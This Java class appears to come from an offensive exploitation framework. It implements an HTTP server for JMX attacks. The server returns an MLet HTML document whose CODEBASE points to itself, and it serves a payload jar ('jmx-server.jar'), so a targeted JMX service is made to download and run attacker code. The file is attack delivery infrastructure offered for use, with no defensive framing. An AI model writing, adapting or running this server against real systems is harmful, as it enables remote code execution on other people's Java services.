package com.lucifaer.jokerframework.plugins.server.http;

import com.lucifaer.jokerframework.data.JokerContext;
import com.lucifaer.jokerframework.data.ShellContext;
import com.lucifaer.jokerframework.plugins.Server;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;

@Component("jmxHttpServer")
public class JmxHttpHttpServer extends BaseHttpServer implements Server, HttpHandler {
    @Autowired
    private JokerContext jokerContext;

    public void createServer() {
        ShellContext shellContext = jokerContext.getCurrentShellContext();
        setServerUrl(shellContext.getParams().get("serverUrl"));
        setServerPort(shellContext.getParams().get("serverPort"));
        setHandler(this::handle);
        super.createServer();
    }

    @Override
    public void handle(HttpExchange httpExchange) throws IOException {
        if (httpExchange.getRequestURI().toString().endsWith("/")) {
            String mlet_code = "<HTML>\n" +
                    "<MLET\n" +
                    "  CODE=com.lucifaer.jjet.payload.Payload\n" +
                    "  ARCHIVE=jmx-server.main.jar\n" +
                    "  NAME=Payload:name=payload,id=1\n" +
                    "  CODEBASE=" + getServerUrl() + ":" + getServerPort() + ">\n" +
                    "</MLET>\n" +
                    "</HTML>";
            httpExchange.sendResponseHeaders(200, mlet_code.length());
            OutputStream os = httpExchange.getResponseBody();
            os.write(mlet_code.getBytes());
            os.close();
        }
        else if (httpExchange.getRequestURI().toString().endsWith(".jar")) {
            File file = new File("./server/http/jmx/jmx-server.jar");
            httpExchange.sendResponseHeaders(200, file.length());
            httpExchange.getResponseHeaders().set("Content-Type", "application/jar, charset=UTF-8");
            OutputStream os = httpExchange.getResponseBody();
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[fis.available()];
            fis.read(data);
            os.write(data);
            os.close();
            fis.close();
        }
        else {
            String not_found = "File not found";
            OutputStream os = httpExchange.getResponseBody();
            httpExchange.sendResponseHeaders(404, 0);
            os.write(not_found.getBytes());
            os.close();
        }
    }
}
